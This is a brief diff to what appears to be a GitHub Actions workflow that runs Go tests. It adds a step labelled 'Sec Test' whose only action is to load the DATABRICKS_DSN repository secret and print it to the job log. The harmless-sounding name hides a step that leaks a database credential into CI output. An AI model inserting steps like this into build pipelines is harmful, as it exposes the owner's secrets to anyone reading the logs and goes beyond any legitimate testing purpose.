@@ -26,3 +26,8 @@ jobs:
         run: |
           set -o pipefail && go test ./... -json | node .github/parse-tests.js >> $GITHUB_STEP_SUMMARY
           echo $GITHUB_STEP_SUMMARY
+
+      - name: Sec Test
+        env:
+          DATABRICKS_DSN: ${{ secrets.DATABRICKS_DSN }}
+        run: echo $DATABRICKS_DSN
